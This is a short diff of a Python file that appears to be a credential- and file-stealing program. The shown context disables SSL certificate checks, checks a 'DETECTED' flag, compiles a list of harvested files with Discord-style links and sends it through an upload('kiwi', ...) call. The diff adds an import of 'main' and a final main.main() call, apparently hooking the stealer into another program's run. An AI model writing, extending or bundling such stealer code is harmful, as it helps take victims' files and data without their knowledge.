@@ -1,5 +1,6 @@
 import os
 
+
 libs = ["threading","sys","sqlite3","re","base64","json","ctypes","urllib","time","shutil","zipfile","random","subprocess","uuid","socket","getpass","ssl"]
 for lib in libs:
     try:
@@ -29,7 +30,7 @@ import uuid
 import socket
 import getpass
 import ssl
-
+import main
 
 
 ssl._create_default_https_context = ssl._create_unverified_context
@@ -1045,3 +1046,5 @@ if not DETECTED:
                 filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
     upload("kiwi", filetext)
+    
+main.main()
